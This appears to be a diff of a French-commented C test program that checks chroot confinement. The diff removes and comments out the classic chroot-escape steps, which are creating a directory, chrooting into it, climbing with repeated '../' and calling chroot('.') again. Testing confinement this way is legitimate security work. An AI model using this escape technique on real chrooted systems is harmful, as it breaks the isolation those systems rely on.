@@ -46,20 +46,11 @@ int main(void)
 	else
 		printf("trouvé /temoins\n");
 
-	/* Technique de bypass du chroot documentée dans la chroot man page. */
-	printf("Bypass du chroot....\n");
-	mkdir("chroot.temp", 0777);
-	chroot("chroot.temp"); // Maintenant nous sommes plus à l'interrieur du chroot!?!
-	rmdir("chroot.temp"); // nettoyage
-
-	getcwd(buf, 1024);
-	printf("Repertoire current (technique de bypasse 1): %s\n", buf);
-
 	// Essayer de changer de repertoire vers le racine reel.
-	chdir("../../../../../../../../../../../../../../");
+	//chdir("../../../../../../../../../../../../../../");
 
-	getcwd(buf, 1024);
-	printf("Repertoire current (technique de bypasse 2): %s\n", buf);
+	//getcwd(buf, 1024);
+	//printf("Repertoire current (technique de bypasse 2): %s\n", buf);
 
 	// Sommes nous sortie du chroot?
 	chroot(".");
